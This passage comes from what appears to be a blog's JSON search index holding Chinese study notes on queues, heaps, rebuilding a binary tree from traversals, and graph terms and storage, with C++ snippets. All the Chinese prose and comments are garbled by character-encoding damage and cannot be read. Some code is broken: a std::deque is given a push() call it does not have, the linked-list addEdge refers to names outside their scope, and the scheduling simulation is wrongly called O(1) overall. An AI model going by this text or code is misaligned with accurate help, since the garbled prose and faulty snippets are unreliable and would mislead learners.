(!outStack.empty()) outStack.pop();\n    }//å¼¹å‡ºé˜Ÿåˆ—\n\n    int front() {\n        if (outStack.empty()) transfer();\n        return outStack.top();\n    }\n\n    bool empty() {\n        return inStack.empty() && outStack.empty();\n    }\n};\n\n\n```\n\næ—¶é—´å¤æ‚åº¦ï¼š`O(1)` æ¯ä¸ªå…ƒç´ æœ€å¤šè¢«ç§»åŠ¨ä¸¤æ¬¡ã€‚\nç©ºé—´å¤æ‚åº¦ï¼š `O(n)` ä¸¤ä¸ªæ ˆï¼Œæœ€å¤š n ä¸ªå…ƒç´ åœ¨æ ˆä¸­ã€‚\n\n---\n## 3. é˜Ÿåˆ—æ¨¡æ‹Ÿä»»åŠ¡è°ƒåº¦\n### é¢˜ç›®æè¿°\né˜Ÿåˆ—ä¸­æ¯ä¸ªä»»åŠ¡æœ‰ä¸€ä¸ªç¼–å·ï¼Œé¡ºåºå…¥é˜Ÿï¼ŒæŒ‰é¡ºåºå¤„ç†ã€‚å¯èƒ½ä¼šå‡ºç°â€œæ’é˜Ÿâ€ï¼ˆæ¯”å¦‚ä¼˜å…ˆä»»åŠ¡ï¼‰ã€‚æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹ã€‚\n\n**ä¸€äº›å¸¸è§é¢˜ç›®å˜å½¢**\n-  å¾ªç¯é˜Ÿåˆ—å®ç°å¤šè¿›ç¨‹\n-  æŸä»»åŠ¡æ‰§è¡Œå®Œåé‡æ–°å…¥é˜Ÿï¼ˆå¤šè½®è½®è½¬ï¼‰\n-  å®ç°å¸¦ä¼˜å…ˆçº§çš„è°ƒåº¦ï¼ˆåŒç«¯é˜Ÿåˆ— / ä¼˜å…ˆé˜Ÿåˆ—ï¼‰\n### åŸºæœ¬æ€è·¯\n- æ™®é€šè°ƒåº¦ï¼šä½¿ç”¨æ™®é€šé˜Ÿåˆ— `queue<T>`\n- æ’é˜Ÿï¼šç”¨ `deque<T>`ï¼Œé«˜ä¼˜å…ˆçº§ä»»åŠ¡ä»é˜Ÿé¦–æ’å…¥\n- æ¨¡æ‹Ÿæ—¶é—´ç‰‡è½®è½¬ï¼šæ¯æ¬¡å¤„ç†ä¸€ä¸ªä»»åŠ¡ï¼Œå°†å…¶æ”¾å›é˜Ÿå°¾\n```cpp\n//è¿™ä¸ªæ˜¯æ²¡æœ‰æ’é˜Ÿçš„æ™®é€šç‰ˆæœ¬\nvoid simulateQueue(vector<int>& tasks) {\n    queue<int> q;\n\n    for (int t : tasks) {\n        q.push(t);  // åˆå§‹å…¥é˜Ÿ\n    }\n\n    while (!q.empty()) {\n        int current = q.front(); q.pop();\n        // å‡è®¾éƒ¨åˆ†ä»»åŠ¡é‡æ–°æ’å…¥é˜Ÿå°¾\n        if (current % 2 == 0) {\n            q.push(current);  // æ¨¡æ‹Ÿéœ€è¦å†æ¬¡å¤„ç†\n        }\n    }\n} \n\n//è¿™ä¸ªä½¿ç”¨æ’é˜Ÿï¼Œéœ€è¦ä½¿ç”¨åŒç«¯é˜Ÿåˆ—ï¼Œè®©ä»»åŠ¡å¯ä»¥pushçš„æ—¶å€™ç›´æ¥åˆ°push_front()\nvoid simulateTaskQueue(const vector<Task>& tasks) {\n    deque<int> q;\n\n    for (const Task& task : tasks) {\n        if (task.urgent) { \n        //å¦‚æœä»»åŠ¡ä¼˜å…ˆä¸ºtrue\n            q.push_front(task.id);  // æ’é˜Ÿ\n        } else {\n            q.push_back(task.id);   // æ­£å¸¸æ’é˜Ÿ\n        }\n    }\n\t//å½“ç„¶ä¹Ÿå¯ä»¥åœ¨å‡ºé˜Ÿä¸Šç”¨åšæ–‡ç« ï¼Œä¸è¿‡è¿™é‡Œä¸å¤šå†™äº†ï¼Œæ€•æœ‰bug\n    while (!q.empty()) {\n        int current = q.front(); q.pop_front();\n        \n         if (current % 2 == 0) {\n            q.push(current);  // æ¨¡æ‹Ÿéœ€è¦å†æ¬¡å¤„ç†\n        }\n    }\n}\n\n```\nä½¿ç”¨STLçš„è¯ï¼Œæ—¶é—´å¤æ‚åº¦åªæ˜¯`O(1)` è€Œå·²ã€‚\n\nå½“ç„¶ï¼Œå¦‚æœé¢˜ç›®æ¶‰åŠä»»åŠ¡æœ‰æƒé‡ä»€ä¹ˆçš„ï¼Œä¸€èˆ¬æˆ‘ä»¬å®ç°æ˜¯ç›´æ¥ç”¨ STL çš„ priority_queue...ä¸è¿‡è¿™é‡Œä¹Ÿæä¾› heap çš„ç®—æ³•æ¨¡æ‹Ÿï¼Œæœ€å¤§å †ã€‚*è¿™ç§æ¶‰åŠæ•°å­¦æ–¹æ³•åˆ†å‰²çš„æˆ‘ä¸€èˆ¬éƒ½ä¸æ€ä¹ˆä¼š...*\n```cpp\nvoid down(int i) { // ä¸‹æ»¤\n    int t = i;\n    if (2 * i <= heapSize && heap[2 * i] > heap[t]) t = 2 * i;\n    if (2 * i + 1 <= heapSize && heap[2 * i + 1] > heap[t]) t = 2 * i + 1;\n    if (t != i) {\n        swap(heap[i], heap[t]);\n        down(t);\n    }\n}\n\nvoid up(int i) { // ä¸Šæ»¤\n    while (i > 1 && heap[i] > heap[i / 2]) {\n        swap(heap[i], heap[i / 2]);\n        i /= 2;\n    }\n}\n\nvoid insert(int x) {\n    heap[++heapSize] = x;\n    up(heapSize);\n}\n\nvoid pop() {\n    heap[1] = heap[heapSize--];\n    down(1);\n}\n\n```\n\n---\n## 4. ä¸­åº + ååºæ„é€ äºŒå‰æ ‘ï¼Œè¾“å‡ºå±‚åºéå†\n\nè¿™é“é¢˜å…¶å®è¿˜å¯ä»¥ç±»æ¯”é‚£äº›çŸ¥é“ä¸­åº+å‰åºéå†æ±‚ååºéå†çš„é¢˜ç›®ï¼Œå¯ä»¥è§ç»å…¸çš„ [æ´›è°· P1827](https://www.luogu.com.cn/problem/P1827)è¿™ç±»é¢˜å‹ã€‚\n\n### åŸºæœ¬æ€è·¯\n- ååºçš„æœ€åä¸€ä¸ªå…ƒç´ æ˜¯å½“å‰æ ¹èŠ‚ç‚¹\n- åœ¨ä¸­åºä¸­æ‰¾åˆ°è¿™ä¸ªæ ¹èŠ‚ç‚¹çš„ä½ç½®ï¼Œè¿™ä¸ªæ ¹èŠ‚ç‚¹å·¦ä¾§æ˜¯å·¦å­æ ‘æ‰€æœ‰èŠ‚ç‚¹ï¼Œå³ä¾§æ˜¯å³å­æ ‘æ‰€æœ‰èŠ‚ç‚¹\n- ä½¿ç”¨é€’å½’æ„å»ºå·¦å³å­æ ‘\n- æ„å»ºå®Œæ¯•åä½¿ç”¨ `queue`è¿›è¡Œç®€å•çš„å…¥é˜Ÿpushå‡ºé˜Ÿpopæ¥é€’å½’å±‚åºéå†ã€‚\n\n```cpp\n//è¿˜åŸæ ‘\nTreeNode* buildTreeHelper(vector<int>& in, vector<int>& post, int inL, int inR, int postL, int postR) {\n    if (inL > inR) return nullptr;\n\n    int rootVal = post[postR];\n    TreeNode* root = new TreeNode(rootVal);\n\n    int k = inL;\n    //å¦‚æœæ˜¯stringçš„è¯ï¼Œæˆ‘ä»¬ç›´æ¥å¯ä»¥str.find(rootVal)æ‰¾åˆ°ä¸­åºéå†ä¸­æ ¹èŠ‚ç‚¹çš„ä½ç½®ã€‚\n    //è¿™å’Œé‚£é“ p1827 æ€è·¯å…¶å®æ˜¯ä¸€è‡´çš„ã€‚\n    while (in[k] != rootVal) ++k;\n    int leftSize = k - inL;\n\n    root->left = buildTreeHelper(in, post, inL, k - 1, postL, postL + leftSize - 1);\n    root->right = buildTreeHelper(in, post, k + 1, inR, postL + leftSize, postR - 1);\n\n    return root;\n}\n\n//å±‚åºéå†\nvoid levelOrder(TreeNode* root) {\n    if (!root) return;\n    queue<TreeNode*> q;\n    q.push(root);\n    while (!q.empty()) {\n        TreeNode* cur = q.front(); q.pop();\n        cout << cur->val << \" \";\n        if (cur->left) q.push(cur->left);\n        if (cur->right) q.push(cur->right);\n    }\n    cout << endl;\n}\n\n```\næ—¶é—´å¤æ‚åº¦ï¼š `O(n)` æ„å»ºäºŒå‰æ ‘å’Œå±‚åºéå†éƒ½æ˜¯è®¿é—®æ ‘æ‰€æœ‰èŠ‚ç‚¹ï¼Œå› æ­¤æ—¶é—´å¤æ‚åº¦ä¸€è‡´ã€‚\nç©ºé—´å¤æ‚åº¦ï¼š `O(n)`\n\n---\n**æ›´æ–°æ–½å·¥ä¸­...**","tags":["å­¦ä¹ ","æ•°æ®ç»“æ„","ç¼–ç¨‹"],"categories":["æ—¥å¸¸å­¦ä¹ ","æ•°æ®ç»“æ„"]},{"title":"æ•°æ®ç»“æ„-å›¾","url":"/2025/04/08/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-tu/","content":"# æ•°æ®ç»“æ„-å›¾\n\nå›¾å°±æ˜¯ä¸€ç¾¤**ç‚¹ä¸ç‚¹ä¹‹é—´çš„è¿æ¥å…³ç³»**ã€‚\n\n> å›¾ = ç‚¹ + å…³ç³»\n\næˆ‘ä»¬ä¸€èˆ¬åˆ©ç”¨çŸ©é˜µå¯¹å®ƒè¿›è¡Œè®¡ç®—ã€‚\n## å›¾çš„æœ¯è¯­\nå›¾çš„æœ¯è¯­å¾ˆå¤šå¾ˆå¤šï¼Œåˆ†ç±»è®°å¿†ä¼˜å…ˆã€‚\n### **ä¸€ç±»ï¼šå¿…é¡»æŒæ¡ï¼Œå†™ä»£ç ä¼šç›´æ¥ç”¨åˆ°çš„æœ¯è¯­**\nè¿™äº›æœ¯è¯­ä¸ä»…æ˜¯å®šä¹‰ï¼Œæ›´æ˜¯å†™ä»£ç ã€åˆ†æé¢˜ç›®çš„å…³é”®è¯\n\n| æœ¯è¯­                | æ„ä¹‰                                |\n| ----------------- | --------------------------------- |\n| **æœ‰å‘å›¾ / æ— å‘å›¾**     | ç®­å¤´ vs æ— ç®­å¤´ï¼Œå½±å“å»ºè¾¹æ–¹å¼ï¼ˆ`add(u,v)` æ˜¯å¦å¯¹ç§°ï¼‰ |\n| **é‚»æ¥ï¼ˆAdjacencyï¼‰** | ä¸€ä¸ªç‚¹ç›¸é‚»çš„æ‰€æœ‰ç‚¹ï¼Œç”¨äº DFS / BFS            |\n| **å‡ºåº¦ / å…¥åº¦ / åº¦**   | å‡ºå»å¤šå°‘æ¡è¾¹ã€è¿›æ¥å¤šå°‘æ¡è¾¹ï¼Œå›¾éå†/æ‹“æ‰‘æ’åºå¸¸ç”¨          |\n| **åŠ æƒå›¾**           | è¾¹æœ‰æƒå€¼äº†ï¼Œè¦ç”¨ `edge.to, edge.w` æ¥å†™     |\n| **ç®€å•è·¯å¾„ / ç®€å•ç¯**    | ä¸é‡å¤ç‚¹çš„è·¯å¾„ / ç¯ï¼ŒDFS æœç´¢è·¯å¾„æ—¶è¦åˆ¤æ–­          |\n| **å­å›¾**            | åŸå›¾çš„ä¸€éƒ¨åˆ†ï¼Œå›¾è®ºç®—æ³•ç»å¸¸è®²â€œæ‰¾å­å›¾â€               |\n\n### **äºŒç±»ï¼šç†è§£äº†å°±èƒ½ç”¨çš„æœ¯è¯­**\nè¿™äº›æœ¯è¯­ä¸æ˜¯å†™ä»£ç çš„å‰æï¼Œä½†å‡ºç°åœ¨ç®—æ³•åˆ†æé‡Œï¼Œæ¯”å¦‚é¢˜å¹²è¯´â€œå¼ºè¿é€šåˆ†é‡â€ï¼Œå¾—çŸ¥é“é‚£æ˜¯å•¥\n\n|æœ¯è¯­|å»ºè®®|\n|---|---|\n|**è¿é€šå›¾ / å¼ºè¿é€šå›¾**|DFS/BFS ä¸€éèƒ½èµ°å®Œ vs æ¯ä¸ªç‚¹éƒ½èƒ½äº’ç›¸åˆ°è¾¾|\n|**è¿é€šåˆ†é‡ / å¼ºè¿é€šåˆ†é‡**|æŠŠå›¾åˆ†æˆâ€œäº’ç›¸èƒ½åˆ°è¾¾çš„å—â€|\n|**æå¤§è¿é€šå­å›¾**|ä¸èƒ½å†æ‰©å±•çš„è¿é€šåˆ†é‡ï¼ŒTarjanç®—æ³•ä¸­ä¼šç”¨|\n|**ç½‘ç»œï¼ˆflow networkï¼‰**|ç”¨äºç½‘ç»œæµï¼Œå‰æœŸæ¥è§¦å°‘ï¼Œå¯ä»¥è§åˆ°å†æŸ¥|\n|**å›è·¯ / ç¯ / ç®€å•ç¯**|DFS æ£€æµ‹ç¯åˆ¤æ–­ç”¨ï¼Œå›¾è®ºé¢˜ä¼šæåˆ°|\n\n ç”»æˆå›¾ç†è§£ï¼Œæœ‰é¢˜å†å›ç¬”è®°å¤ä¹ ï¼Œä¸éœ€è¦æ­»è®°ç¡¬èƒŒæœ¯è¯­ã€‚\n è®©Gè€å¸ˆæ•´ç†äº†ä¸€ä¸ªç®€ç•¥çš„æ¨¡æ¿ï¼Œå¤åˆ¶ç²˜è´´ä¸€ä¸‹ã€‚\n \n ### å›¾è®ºæœ¯è¯­å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›æŸ¥é˜…\n\n| æœ¯è¯­       | ä¸­æ–‡è§£é‡Š                             | å›¾è®ºä¸¾ä¾‹              | ä»£ç æ„ä¹‰ / ä½¿ç”¨åœºæ™¯               |\n| -------- | -------------------------------- | ----------------- | ------------------------- |\n| æœ‰å‘å›¾      | è¾¹æœ‰æ–¹å‘ï¼ŒAâ†’B ä¸ Bâ†’A ä¸åŒ                | A â†’ B â†’ C         | é‚»æ¥è¡¨åªå­˜ uâ†’vï¼Œä¸åŠ åè¾¹            |\n| æ— å‘å›¾      | è¾¹æ— æ–¹å‘ï¼ŒA-B æ˜¯åŒå‘çš„                    | A - B - C         | å»ºè¾¹è¦åŠ ä¸¤æ¬¡ uâ†”v                |\n| é‚»æ¥       | æŸä¸ªç‚¹èƒ½ç›´æ¥åˆ°è¾¾çš„ç‚¹                       | A ç›¸é‚»ç‚¹ä¸º B, C       | DFS / BFS / æœ€çŸ­è·¯æ ¸å¿ƒ         |\n| å…¥åº¦       | è¿›å…¥è¯¥ç‚¹çš„è¾¹æ•°                          | C æœ‰å…¥åº¦ 2ï¼šAâ†’C, Bâ†’C  | æ‹“æ‰‘æ’åºåˆ¤æ–­æ˜¯å¦å…¥åº¦ä¸º 0             |\n| å‡ºåº¦       | ä»è¯¥ç‚¹å‡ºå‘çš„è¾¹æ•°                         | A æœ‰å‡ºåº¦ 1ï¼šAâ†’B       | æ„å»ºé‚»æ¥è¡¨æˆ–æœ€çŸ­è·¯ç”¨                |\n| åº¦        | æ— å‘å›¾ä¸­ä¸è¯¥ç‚¹ç›¸è¿çš„æ€»è¾¹æ•°                    | B æœ‰åº¦ 3ï¼šè¿äº† A, C, D | ç»Ÿè®¡å›¾ç»“æ„å¤æ‚åº¦                  |\n| åŠ æƒå›¾      | æ¯æ¡è¾¹æœ‰æƒé‡å€¼ï¼ˆå¦‚è·ç¦»ã€ä»£ä»·ï¼‰                  | è¾¹ Aâ†’B æƒé‡ä¸º 3       | éœ€è¦é¢å¤–è®°å½•æƒé‡ edge.w           |\n| ç®€å•è·¯å¾„     | è·¯å¾„ä¸­ç‚¹ä¸é‡å¤                          | Aâ†’Bâ†’C åˆæ³•          | DFS ä¸­ç”¨ visited[] é˜²æ­¢é‡å¤     |\n| ç®€å•ç¯ / å›è·¯ | ç‚¹ä¸é‡å¤çš„é—­ç¯                          | Aâ†’Bâ†’A æ˜¯ç®€å•ç¯        | åˆ¤æ–­æ˜¯å¦æœ‰ç¯                    |\n| å­å›¾       | å›¾çš„ä¸€éƒ¨åˆ†ï¼ˆç‚¹ä¸è¾¹çš„å­é›†ï¼‰                    | G çš„å­å›¾ä»…å« A, B, C   | å¤§å›¾ä¸­åˆ’åˆ†å­é—®é¢˜                  |\n| è¿é€šå›¾      | ä»»æ„ä¸¤ä¸ªç‚¹ä¹‹é—´æœ‰è·¯å¾„                       | ä¸€ç¬”èƒ½èµ°å®Œæ‰€æœ‰ç‚¹          | ç”¨ DFS / BFS åˆ¤æ–­è¿é€šæ€§         |\n| å¼ºè¿é€šå›¾     | æœ‰å‘å›¾ä¸­ä»»æ„ä¸¤ç‚¹äº’è¾¾                       | æ‰€æœ‰ç‚¹ä¹‹é—´éƒ½æœ‰åŒå‘è·¯å¾„       | Tarjan ç®—æ³•ä¸­å¼ºè¿é€šåˆ†é‡ï¼ˆSCCï¼‰åˆ¤å®š    |\n| è¿é€šåˆ†é‡     | è¿é€šå›¾ä¸­ç‹¬ç«‹çš„â€œå—â€                       | ä¸€ä¸ªå›¾è¢«åˆ†æˆå¤šä¸ªè¿é€šå­å›¾      | å¹¶æŸ¥é›†æ‰¾è¿é€šå— / ç»Ÿè®¡å›¾ä¸­æœ‰å‡ ä¸ªåˆ†é‡       |\n| å¼ºè¿é€šåˆ†é‡    | å¼ºè¿é€šå›¾ä¸­çš„â€œæå¤§å—â€                      | Tarjan ç®—æ³•è¯†åˆ«å¼ºè¿é€šéƒ¨åˆ†  | æ‹†å›¾ç»“æ„ã€é¢˜ç›®è¦æ±‚æ‰¾ SCC æ—¶ä½¿ç”¨        |\n| æå¤§è¿é€šå­å›¾   | æ— æ³•å†æ‰©å±•çš„è¿é€šå›¾                        | ä¸€æ¬¡ DFS å¾—åˆ°çš„æ•´å—      | åˆ¤æœ€å¤§å›¾ç»“æ„ / DFS å±€éƒ¨å›¾éå†        |\n| æå°è¿é€šå­å›¾   | åŒ…å«æ‰€æœ‰ç‚¹ã€æœ€å°‘è¾¹çš„è¿é€šå›¾ï¼Œå»æ‰ä¸€æ¡è¾¹å°±ä¸è¿é€šï¼Œå¢åŠ ä¸€æ¡è¾¹å°±æˆç¯ | åŸå›¾æœ‰ç¯ï¼Œç”Ÿæˆæ ‘å»æ‰äº†å†—ä½™è¾¹    | ç”¨æ¥æè¿° MST çš„æ€§è´¨/å†™é¢˜æ—¶åˆ¤æ–­å›¾æ˜¯å¦æˆæ ‘å¸¸ç”¨ |\n| ç½‘ç»œï¼ˆflowï¼‰ | å¸¦å®¹é‡é™åˆ¶çš„æœ‰å‘å›¾                        | è¾¹ Aâ†’B æœ€å¤§æµ 5       | æœ€å¤§æµ / æœ€å°å‰²ç­‰ç½‘ç»œæµå»ºæ¨¡           |\n\n---\n## æ¯”è¾ƒ\nçº¿æ€§ã€æ ‘ã€å›¾ç»“æ„ä¸­\n- çº¿æ€§ç»“æ„ä¸­ï¼Œæ¯ä¸ªå…ƒç´ åªæœ‰**ä¸€ä¸ªç›´æ¥å‰é©±å’Œç›´æ¥åç»§**ã€‚\n- æ ‘å½¢ç»“æ„ä¸­ï¼Œæ¯ä¸ªå…ƒç´ ä¸­æœ‰**ä¸€ä¸ªç›´æ¥å‰é©±**ï¼Œä½†å¯ä»¥æœ‰**å¤šä¸ªç›´æ¥åç»§**ã€‚\n- å›¾å½¢ç»“æ„ä¸­ï¼Œæ•°æ®å…ƒç´ ä¹‹é—´çš„å…³ç³»ä»»æ„ã€‚æ¯ä¸ªå…ƒç´ å¯ä»¥å’Œä»»æ„å¤šä¸ªæ•°æ®å…ƒç´ ç›¸å…³ï¼Œæœ‰ä»»æ„å¤šä¸ªç›´æ¥å‰é©±å’Œç›´æ¥åç»§ã€‚*ï¼ˆåœ¨æ— å‘å›¾ä¸­ï¼Œåœ¨æœ‰å‘å›¾è§†è§’ä¸‹ç”šè‡³äº’ä¸ºå‰é©±åç»§ï¼‰*\n---\n## å®ç°\n### ADTçš„C++ç±»è¡¨ç¤º\n>`Graph` æ˜¯ä¸€ä¸ªæ”¯æŒæ·»åŠ è¾¹ã€éå†ï¼ˆDFS/BFSï¼‰ã€è·å–é‚»æ¥ç‚¹çš„æŠ½è±¡å›¾ç»“æ„ã€‚  \n   æ”¯æŒæœ‰å‘å›¾å’Œæ— å‘å›¾çš„å»ºå›¾å½¢å¼ï¼Œåº•å±‚ä½¿ç”¨é‚»æ¥è¡¨å®ç°ã€‚é€‚åˆä½œä¸ºå›¾è®ºç®—æ³•çš„åŸºç¡€ç±»ã€‚\n   \n```cpp\n// å›¾çš„æŠ½è±¡æ•°æ®ç±»å‹ï¼ˆADTï¼‰ç»“æ„è¡¨ç¤º\nclass Graph {\nprivate:\n    int V; // é¡¶ç‚¹æ•°é‡\n    bool directed; // æ˜¯å¦ä¸ºæœ‰å‘å›¾\n    vector<vector<int>> adj; // é‚»æ¥è¡¨è¡¨ç¤ºå›¾\n\npublic:\n    // æ„é€ å‡½æ•°ï¼šåˆå§‹åŒ–å›¾çš„é¡¶ç‚¹æ•°é‡ä¸æœ‰å‘/æ— å‘æ ‡å¿—\n    Graph(int vertices, bool isDirected = false) {\n        V = vertices;\n        directed = isDirected;\n        adj.resize(V);\n    }\n\n    // æ·»åŠ ä¸€æ¡è¾¹ï¼ˆu åˆ° vï¼‰\n    void addEdge(int u, int v) {\n        adj[u].push_back(v);\n        if (!directed) {\n            adj[v].push_back(u); // æ— å‘å›¾åŠ åŒå‘è¾¹\n        }\n    }\n\n    // è·å–ä¸€ä¸ªç‚¹çš„æ‰€æœ‰é‚»æ¥ç‚¹\n    vector<int> getNeighbors(int u) {\n        return adj[u];\n    }\n\n    // æ·±åº¦ä¼˜å…ˆéå†ï¼ˆDFSï¼‰\n    void DFS(int start, vector<bool>& visited) {\n        visited[start] = true;\n        for (int v : adj[start]) {\n            if (!visited[v]) {\n                DFS(v, visited);\n            }\n        }\n    }\n\n    // å¹¿åº¦ä¼˜å…ˆéå†ï¼ˆBFSï¼‰\n    void BFS(int start) {\n        vector<bool> visited(V, false);\n        queue<int> q;\n        q.push(start);\n        visited[start] = true;\n        while (!q.empty()) {\n            int u = q.front(); q.pop();\n            for (int v : adj[u]) {\n                if (!visited[v]) {\n                    visited[v] = true;\n                    q.push(v);\n                }\n            }\n        }\n    }\n\n    // è·å–å›¾ä¸­é¡¶ç‚¹æ•°é‡\n    int getVertexCount() const {\n        return V;\n    }\n\n    // è·å–å›¾ä¸­æŸç‚¹çš„åº¦æ•°ï¼ˆæ— å‘å›¾ï¼‰æˆ–å‡ºåº¦ï¼ˆæœ‰å‘å›¾ï¼‰\n    int getDegree(int u) const {\n        return adj[u].size();\n    }\n};\n\n```\n### å­˜å‚¨\nå›¾çš„å­˜å‚¨ç”¨äºå­˜å‚¨ç‚¹å’Œè¾¹çš„å…³ç³»ï¼Œä¸»è¦æœ‰2ç§æ–¹æ³•ã€‚\n- é‚»æ¥çŸ©é˜µï¼šç”¨ä¸€ä¸ªäºŒç»´è¡¨æ ¼è®°å½•â€œæœ‰æ²¡æœ‰è¾¹â€\n- é‚»æ¥è¡¨ï¼šæ¯ä¸ªç‚¹æœ‰ä¸€å¼ è‡ªå·±çš„â€œå‡ºè¾¹åå•â€\n#### é‚»æ¥çŸ©é˜µï¼ˆäºŒç»´æ•°ç»„ï¼‰\n- é€‚åˆå°å›¾ï¼Œæ„é€ ç®€å•ç›´æ¥ã€‚æœ‰å‡ ä¸ªé¡¶ç‚¹å°±å­˜å‡ ä¸ªæ–¹å‘ã€‚\n- **åœ¨ä¸€ç»´æ•°ç»„é‡Œé¢å­˜å‚¨é¡¶ç‚¹ä¿¡æ¯ï¼ŒäºŒç»´çŸ©é˜µä¸­å­˜å‚¨è¾¹çš„ä¿¡æ¯**ã€‚\n- ç”¨ä¸€ä¸ªäºŒç»´æ•°ç»„ `g[i][j]` è¡¨ç¤º\n\tæœ‰è¾¹ï¼š`g[i][j] = 1`ï¼ˆæˆ–æƒå€¼ wï¼‰\n\tæ²¡è¾¹ï¼š`g[i][j] = 0`ï¼ˆæˆ– INFï¼Œæ— ç©·å¤§)\n\t\n![](/images/æ•°æ®ç»“æ„-å›¾/20250325111944762.png)\nå¯¹äº**ç¨ å¯†å›¾ï¼Œæœ‰å‘å›¾**ï¼Œé‡‡ç”¨é‚»æ¥çŸ©é˜µéå¸¸åˆé€‚ã€‚ä½†å­˜å‚¨å¤§é‡æ— è¾¹ä¿¡æ¯ï¼Œé€ æˆç©ºé—´æµªè´¹ã€‚\n*è¿™ä¸ªå¾ˆå¥½æ„é€ ï¼Œåˆ›ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œèµ‹å€¼å…³ç³»é—´å°±å¥½ã€‚æ¯”å¦‚1å·å…ƒç´ æŒ‡å‘2å·å…ƒç´ ï¼Œæƒå€¼ä¸º2ï¼Œåˆ™*  `g[1][2]=2` \nå¯¹äºä¸€äº›æœ‰æƒå›¾é—®é¢˜ï¼Œæˆ‘ä»¬ä¸ºäº†ä»£ç èƒ½è·‘ï¼Œç»å¸¸ä¼šè®¾ç½®INFï¼Œè¾…åŠ©æœ€å°è·¯å¾„é—®é¢˜ï¼Œè¿™æ ·è¾“å…¥ä¹Ÿæ–¹ä¾¿\n```cpp\nif (graph[i][j] == 0 && i != j) graph[i][j] = INF;\n```\n\n#### é‚»æ¥è¡¨\né‚»æ¥è¡¨çš„å®ç°å’Œé‚»æ¥çŸ©é˜µå¾ˆåƒï¼Œä½†ä¸çº¦æŸäºé‚»æ¥çŸ©é˜µ`n*n`çš„å›ºå®šå¤§å°ã€‚\næ¯ä¸€ä¸ªé¡¶ç‚¹ä½¿ç”¨ä¸€ä¸ª**ä¸€ç»´æ•°ç»„**æ¥å­˜å‚¨ï¼Œè€Œè¾¹çš„å­˜å‚¨æ˜¯åŒä¸€ä¸ªé¡¶ç‚¹å‡ºå‘çš„æ‰€æœ‰è¾¹ï¼Œç»„æˆ**ä¸€æ¡å•é“¾è¡¨**ã€‚\næˆ‘ä»¬ç”¨ STL å®ç°çš„è¯ï¼Œvector çš„ push_back() å¾ˆå¥½çš„èµ·åˆ°äº†é‚»æ¥è¡¨çš„å®ç°æ¥å­˜å‚¨å›¾ã€‚é‚»æ¥è¡¨å°±æ˜¯é“¾è¡¨å¼çš„å›¾ç»“æ„ã€‚\nå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ç”¨é“¾è¡¨ï¼Œè·³è½¬ã€‚\n![](/images/æ•°æ®ç»“æ„-å›¾/20250325113155345.png)\nå¯¹äº**ç¨€ç–å›¾ï¼Œæ— å‘å›¾**ï¼Œé‡‡ç”¨é‚»æ¥è¡¨éå¸¸åˆé€‚ã€‚ç©ºé—´åˆ©ç”¨æ•ˆç‡å¤§å¹…åº¦æé«˜ï¼Œä¸å­˜å‚¨æ— è¾¹çš„æ— ç”¨ä¿¡æ¯ã€‚\n##### STL å®ç°\n**æ— æƒå›¾ç‰ˆæœ¬**\n```cpp\n//åŸºæœ¬ç»“æ„\nconst int N = 10010; // æœ€å¤§ç‚¹æ•°\nvector<int> graph[N]; // é‚»æ¥è¡¨ï¼šgraph[u] å­˜æ”¾ u çš„é‚»æ¥ç‚¹\n\n//åŠ è¾¹æ“ä½œ\nvoid addEdge(int u, int v) {\n    graph[u].push_back(v);\n    graph[v].push_back(u); // æ— å‘å›¾è¦åŠ ä¸¤æ¬¡\n}\n\n//éå†\nfor (int v : graph[u]) {\n    // u â†’ v æœ‰ä¸€æ¡è¾¹\n}\n//éå¸¸ç±»ä¼¼é“¾è¡¨éå†ï¼Œæ¯ä¸ªç‚¹è‡ªå·±çš„é“¾è¡¨å°±æ˜¯vector\n```\n**æœ‰æƒå›¾ç‰ˆæœ¬**\n\n```cpp\nvector<pair<int, int>> graph[N]; // pair<to, weight>\n\nvoid addEdge(int u, int v, int w) {\n    graph[u].push_back({v, w});\n    // å¦‚æœæ˜¯æ— å‘å›¾ï¼š\n    // graph[v].push_back({u, w});\n}\n\nfor (auto [v, w] : graph[u]) {\n    // u â†’ v, æƒé‡ä¸º w\n}\n\n\n```\n ##### **é“¾è¡¨å®ç°**\n ```cpp\n struct Graph {\n    struct Node {//è¾¹çš„æ„é€ \n        int to;           // è¾¹é€šå¾€å“ªä¸ªç‚¹\n        Node* next;       // è¿˜æœ‰æ²¡æœ‰å…¶ä»–è¾¹ä»è¯¥åº—å‡ºå»\n    };\n\n    Node* head[N];        // å›¾çš„ç‚¹å¯¹åº”çš„è¾¹ï¼Œæ˜¯æ•°ç»„\n};\n\nvoid addEdge(int from, int to) {\n    Node* newNode = new Node{to, head[from]};\n    head[from] = newNode;\n}\n//æ’å…¥è¾¹\n```\n\n> â€œå¦‚æœä¸€ä¸ªç‚¹æœ‰å¾ˆå¤šå‡ºè¾¹æ€ä¹ˆåŠï¼Ÿå¦‚æœæ²¡æœ‰å‡ºè¾¹æ€ä¹ˆåŠï¼Ÿâ€\n\né‚£æˆ‘ä»¬å°±åå‘æ€ç»´ï¼Œæˆ‘ä»¬é“¾è¡¨å­˜å‚¨çš„æ˜¯**å›¾çš„è¾¹**ï¼Œå¹¶éå›¾çš„æ‰€æœ‰ç‚¹ã€‚ç‚¹å¯ä»¥å¯¹åº”å¾ˆå¤šè¾¹ï¼Œä½†è¾¹å¯ä»¥å¯¹åº”åªæœ‰ä¸¤ä¸ªç‚¹ã€‚è€Œä¸”æˆ‘ä»¬å›¾çš„å…³ç³»ï¼Œçœ‹çš„å¾€å¾€æ˜¯è¾¹çš„å…³ç³»ã€‚\n- é¡¶ç‚¹ç¼–å· = `head[i]` ä¸­çš„ `i`\n- è¾¹ = å­˜åœ¨äºä» `i` å‡ºå‘çš„ä¸€ä¸² `Node`\n- `to` æŒ‡å‘çš„æ˜¯è¯¥è¾¹çš„åˆ°è¾¾ç‚¹ï¼Œå‡ºå‘ç‚¹å°±æ˜¯æ’å…¥è¿™æ¡è¾¹çš„æ—¶å€™æ‰€åœ¨çš„ä¸‹æ ‡ã€‚\n\næ’å…¥è¾¹ç›´æ¥ addEdge(1,2)ï¼Œæ’å…¥ä¸€æ¡ä»1æŒ‡å‘2çš„è¾¹ã€‚æˆ‘ä»¬æ¯ä¸€æ¬¡æ„é€ éƒ½æ˜¯æ’å…¥ Node ã€‚\n `head[from] = newNode` è¡¨é¢ä¸Šæ˜¯èµ‹å€¼ï¼Œ  